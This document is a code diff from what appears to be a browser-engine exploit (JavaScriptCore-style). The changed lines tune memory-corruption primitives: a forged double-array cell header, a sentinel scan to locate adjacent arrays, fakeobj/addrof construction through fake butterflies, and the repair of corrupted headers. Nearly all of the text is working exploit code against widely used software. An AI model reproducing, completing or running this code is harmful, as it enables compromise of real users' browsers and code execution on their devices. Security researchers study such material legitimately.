@@ -412,7 +412,7 @@ var VM_PROT_EXECUTE = 0x4
             return d - kBoxedDoubleOffset;
           }
           // the structure ID is wrong, but we'll fix it :)
-          let doubleArrayCellHeader = new Int64(0x0108230700000000).asJSValue();
+          let doubleArrayCellHeader = new Int64("0x0108200700001000").asJSValue();
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
           function float2bigint(v,set) {
@@ -460,12 +460,12 @@ var VM_PROT_EXECUTE = 0x4
               port.postMessage("Failure on array length");
               return;
             }
-            const kSentinel = 1333.337;
+            const kSentinel = 13.37;
             let offset = -1;
             b1[0] = kSentinel;
             // scan for the sentinel to find the offset from a to b
             for (var i = 0; i < 0x100; i++) {
-              if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
+              if (new Int64(new Int64.fromDouble(a1[i])).asDouble() == kSentinel) {
                 offset = i;
                 break;
               }
@@ -493,7 +493,7 @@ var VM_PROT_EXECUTE = 0x4
            
             let fakeArr = fakeobj(Add(addr,new Int64(0x10))); //no way around this im forced to use bigint for fakeobj :(
             // subtract off the incref
-            doubleArrayCellHeader = Sub(new Int64.fromDouble(fakeArr[0]),new Int64(0x1));
+            doubleArrayCellHeader = Sub(Int64.fromDouble(fakeArr[0]),new Int64(0x1));
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
             // fix broken cell header
             fakeArr[0] = new Int64(doubleArrayCellHeader).asDouble();
@@ -501,9 +501,9 @@ var VM_PROT_EXECUTE = 0x4
             let doubleArrayButterfly = new Int64.fromDouble(fakeArr[1]);
             // fix other broken cell header
             obj.fakeButterfly = b0;
-            fakeArr[0] = new Int64.fromDouble(doubleArrayCellHeader);
+            fakeArr[0] = new Int64(doubleArrayCellHeader).asDouble();
             // fix the broken butterflys and setup cleaner addrof / fakeobj
-            obj.jsCellHeader = new Int64.fromDouble(new Int64(doubleArrayCellHeader).asJSValue());
+            obj.jsCellHeader = new Int64(doubleArrayCellHeader).asDouble();
             obj.fakeButterfly = a1;
             fakeArr[1] = new Int64(doubleArrayButterfly).asDouble();
             obj.fakeButterfly = b1;
